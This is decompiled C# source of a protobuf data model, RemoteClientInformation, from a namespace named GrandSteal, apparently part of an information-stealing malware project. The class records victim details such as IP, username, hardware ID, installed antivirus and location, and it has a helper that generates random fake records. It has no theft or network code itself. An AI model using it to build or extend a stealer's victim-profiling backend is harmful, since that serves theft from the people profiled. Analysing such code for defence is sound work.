using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Text;
using ProtoBuf;

namespace GrandSteal.SharedModels.Models
{
	// Token: 0x02000014 RID: 20
	[ProtoContract(Name = "RemoteClientInformation")]
	public class RemoteClientInformation : INotifyPropertyChanged, IEqualityComparer<RemoteClientInformation>
	{
		// Token: 0x060000CC RID: 204 RVA: 0x0000220E File Offset: 0x0000040E
		public RemoteClientInformation()
		{
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00003C84 File Offset: 0x00001E84
		public RemoteClientInformation(RemoteClientInformation remoteClientInformation)
		{
			this.ID = remoteClientInformation.ID;
			this.HardwareID = remoteClientInformation.HardwareID;
			this.ClientIP = remoteClientInformation.ClientIP;
			this.UserName = remoteClientInformation.UserName;
			this.SourceID = remoteClientInformation.SourceID;
			this.OperationSystem = remoteClientInformation.OperationSystem;
			this.Country = remoteClientInformation.Country;
			this.Hardwares = remoteClientInformation.Hardwares;
			this.LogTime = remoteClientInformation.LogTime;
			this.Antiviruses = remoteClientInformation.Antiviruses;
			this.Languages = remoteClientInformation.Languages;
			this.CurrentLanguage = remoteClientInformation.CurrentLanguage;
			this.MonitorSize = remoteClientInformation.MonitorSize;
			this.TimeZone = remoteClientInformation.TimeZone;
			this.City = remoteClientInformation.City;
		}

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000CE RID: 206 RVA: 0x00002C24 File Offset: 0x00000E24
		// (set) Token: 0x060000CF RID: 207 RVA: 0x00002C2C File Offset: 0x00000E2C
		[ProtoMember(1, Name = "ID")]
		public int ID
		{
			get
			{
				return this._iD;
			}
			set
			{
				this._iD = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("ID"));
			}
		}

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000D0 RID: 208 RVA: 0x00002C50 File Offset: 0x00000E50
		// (set) Token: 0x060000D1 RID: 209 RVA: 0x00002C58 File Offset: 0x00000E58
		[ProtoMember(2, Name = "HardwareID")]
		public string HardwareID
		{
			get
			{
				return this._hardwareID;
			}
			set
			{
				this._hardwareID = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("HardwareID"));
			}
		}

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000D2 RID: 210 RVA: 0x00002C7C File Offset: 0x00000E7C
		// (set) Token: 0x060000D3 RID: 211 RVA: 0x00002C84 File Offset: 0x00000E84
		[ProtoMember(3, Name = "ClientIP")]
		public string ClientIP
		{
			get
			{
				return this._clientIP;
			}
			set
			{
				this._clientIP = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("HardwareID"));
			}
		}

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060000D4 RID: 212 RVA: 0x00002CA8 File Offset: 0x00000EA8
		// (set) Token: 0x060000D5 RID: 213 RVA: 0x00002CB0 File Offset: 0x00000EB0
		[ProtoMember(4, Name = "UserName")]
		public string UserName
		{
			get
			{
				return this._userName;
			}
			set
			{
				this._userName = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("UserName"));
			}
		}

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060000D6 RID: 214 RVA: 0x00002CD4 File Offset: 0x00000ED4
		// (set) Token: 0x060000D7 RID: 215 RVA: 0x00002CDC File Offset: 0x00000EDC
		[ProtoMember(5, Name = "SourceID")]
		public string SourceID
		{
			get
			{
				return this._sourceID;
			}
			set
			{
				this._sourceID = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("SourceID"));
			}
		}

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060000D8 RID: 216 RVA: 0x00002D00 File Offset: 0x00000F00
		// (set) Token: 0x060000D9 RID: 217 RVA: 0x00002D08 File Offset: 0x00000F08
		[ProtoMember(6, Name = "OperationSystem")]
		public string OperationSystem
		{
			get
			{
				return this._operationSystem;
			}
			set
			{
				this._operationSystem = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("OperationSystem"));
			}
		}

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060000DA RID: 218 RVA: 0x00002D2C File Offset: 0x00000F2C
		// (set) Token: 0x060000DB RID: 219 RVA: 0x00002D34 File Offset: 0x00000F34
		[ProtoMember(7, Name = "Country")]
		public string Country
		{
			get
			{
				return this._country;
			}
			set
			{
				this._country = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("Country"));
			}
		}

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060000DC RID: 220 RVA: 0x00003D4C File Offset: 0x00001F4C
		// (set) Token: 0x060000DD RID: 221 RVA: 0x00002D58 File Offset: 0x00000F58
		[ProtoMember(8, Name = "Hardwares")]
		public List<Hardware> Hardwares
		{
			get
			{
				List<Hardware> arg_18_0;
				if ((arg_18_0 = this._hardwares) == null)
				{
					arg_18_0 = (this._hardwares = new List<Hardware>());
				}
				return arg_18_0;
			}
			set
			{
				this._hardwares = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("Hardwares"));
			}
		}

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x060000DE RID: 222 RVA: 0x00002D7C File Offset: 0x00000F7C
		// (set) Token: 0x060000DF RID: 223 RVA: 0x00002D84 File Offset: 0x00000F84
		[ProtoMember(9, Name = "LogTime")]
		public DateTime LogTime
		{
			get
			{
				return this._logTime;
			}
			set
			{
				this._logTime = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("LogTime"));
			}
		}

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x060000E0 RID: 224 RVA: 0x00003D74 File Offset: 0x00001F74
		// (set) Token: 0x060000E1 RID: 225 RVA: 0x00002DA8 File Offset: 0x00000FA8
		[ProtoMember(10, Name = "Antiviruses")]
		public List<string> Antiviruses
		{
			get
			{
				List<string> arg_18_0;
				if ((arg_18_0 = this._antiviruses) == null)
				{
					arg_18_0 = (this._antiviruses = new List<string>());
				}
				return arg_18_0;
			}
			set
			{
				this._antiviruses = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("Antiviruses"));
			}
		}

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x060000E2 RID: 226 RVA: 0x00002DCC File Offset: 0x00000FCC
		// (set) Token: 0x060000E3 RID: 227 RVA: 0x00002DD4 File Offset: 0x00000FD4
		[ProtoMember(11, Name = "Languages")]
		public List<string> Languages
		{
			get
			{
				return this._languages;
			}
			set
			{
				this._languages = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("Languages"));
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060000E4 RID: 228 RVA: 0x00002DF8 File Offset: 0x00000FF8
		// (set) Token: 0x060000E5 RID: 229 RVA: 0x00002E00 File Offset: 0x00001000
		[ProtoMember(12, Name = "CurrentLanguage")]
		public string CurrentLanguage
		{
			get
			{
				return this._currentLanguage;
			}
			set
			{
				this._currentLanguage = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("CurrentLanguage"));
			}
		}

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060000E6 RID: 230 RVA: 0x00002E24 File Offset: 0x00001024
		// (set) Token: 0x060000E7 RID: 231 RVA: 0x00002E2C File Offset: 0x0000102C
		[ProtoMember(13, Name = "MonitorSize")]
		public string MonitorSize
		{
			get
			{
				return this._monitorSize;
			}
			set
			{
				this._monitorSize = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("MonitorSize"));
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060000E8 RID: 232 RVA: 0x00002E50 File Offset: 0x00001050
		// (set) Token: 0x060000E9 RID: 233 RVA: 0x00002E58 File Offset: 0x00001058
		[ProtoMember(14, Name = "TimeZone")]
		public string TimeZone
		{
			get
			{
				return this._timeZone;
			}
			set
			{
				this._timeZone = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("TimeZone"));
			}
		}

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x060000EA RID: 234 RVA: 0x00002E7C File Offset: 0x0000107C
		// (set) Token: 0x060000EB RID: 235 RVA: 0x00002E84 File Offset: 0x00001084
		[ProtoMember(15, Name = "City")]
		public string City
		{
			get
			{
				return this._city;
			}
			set
			{
				this._city = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("City"));
			}
		}

		// Token: 0x1400000E RID: 14
		// (add) Token: 0x060000EC RID: 236 RVA: 0x00003D9C File Offset: 0x00001F9C
		// (remove) Token: 0x060000ED RID: 237 RVA: 0x00003DD4 File Offset: 0x00001FD4
		[method: CompilerGenerated]
		[CompilerGenerated]
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x060000EE RID: 238 RVA: 0x00003E0C File Offset: 0x0000200C
		public static RemoteClientInformation CreateRandom()
		{
			return new RemoteClientInformation
			{
				ClientIP = string.Format("{0}.{1}.{2}.{3}", new object[]
				{
					RemoteClientInformation._random.Next(0, 255),
					RemoteClientInformation._random.Next(0, 255),
					RemoteClientInformation._random.Next(0, 255),
					RemoteClientInformation._random.Next(0, 255)
				}),
				Country = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 2),
				HardwareID = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 20),
				Hardwares = new List<Hardware>(),
				LogTime = DateTime.Now,
				OperationSystem = "WIN10 " + RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 5) + " Edition",
				SourceID = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM" + RemoteClientInformation._lowerChars, 6),
				UserName = RemoteClientInformation.RandomString(RemoteClientInformation._lowerChars, 10)
			};
		}

		// Token: 0x060000EF RID: 239 RVA: 0x00003F1C File Offset: 0x0000211C
		private static string RandomString(string sourceChars, int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(sourceChars[RemoteClientInformation._random.Next(0, sourceChars.Length - 1)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x00002EA8 File Offset: 0x000010A8
		public bool Equals(RemoteClientInformation x, RemoteClientInformation y)
		{
			return x.HardwareID == y.HardwareID;
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00003F64 File Offset: 0x00002164
		public int GetHashCode(RemoteClientInformation obj)
		{
			int num = 14689;
			if (!string.IsNullOrEmpty(obj.HardwareID))
			{
				num += obj.HardwareID.GetHashCode();
			}
			return num;
		}

		// Token: 0x0400005A RID: 90
		private static readonly Random _random = new Random();

		// Token: 0x0400005B RID: 91
		private const string _upperChars = "QWERTYUIOPASDFGHJKLZXCVBNM";

		// Token: 0x0400005C RID: 92
		private static readonly string _lowerChars = "QWERTYUIOPASDFGHJKLZXCVBNM".ToLower();

		// Token: 0x0400005D RID: 93
		private int _iD;

		// Token: 0x0400005E RID: 94
		private string _city;

		// Token: 0x0400005F RID: 95
		private string _currentLanguage;

		// Token: 0x04000060 RID: 96
		private string _monitorSize;

		// Token: 0x04000061 RID: 97
		private string _timeZone;

		// Token: 0x04000062 RID: 98
		private string _hardwareID;

		// Token: 0x04000063 RID: 99
		private string _clientIP;

		// Token: 0x04000064 RID: 100
		private string _userName;

		// Token: 0x04000065 RID: 101
		private string _sourceID;

		// Token: 0x04000066 RID: 102
		private string _operationSystem;

		// Token: 0x04000067 RID: 103
		private string _country;

		// Token: 0x04000068 RID: 104
		private List<Hardware> _hardwares;

		// Token: 0x04000069 RID: 105
		private DateTime _logTime;

		// Token: 0x0400006A RID: 106
		private List<string> _antiviruses;

		// Token: 0x0400006B RID: 107
		private List<string> _languages;
	}
}
